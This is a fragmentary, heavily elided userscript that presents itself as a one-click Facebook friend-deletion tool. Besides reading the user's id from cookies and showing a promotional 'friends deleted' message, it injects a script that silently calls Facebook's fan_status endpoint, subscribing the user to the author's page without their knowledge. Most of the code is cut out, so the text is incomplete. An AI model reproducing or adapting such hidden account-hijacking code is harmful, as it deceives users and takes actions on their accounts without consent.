// ==UserScript==
// @name        Delete teman In Single-Click on Facebook by Arek Deso
...
// @version     2.2 Beta
// ==/UserScript==
// Developed by Arek Deso - http://www.facebook.com/see.girls
function sleep(x) {
...
function replace_msg(x) {
	$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Like us at <a target="_blank" href="http://www.facebook.com/pages/Hanya-sekedar-sharing/131087660267543">Hanya sekedar sharing</a> for more useful tips/tricks and more!');
}
set_timer();
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:131087660267543,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
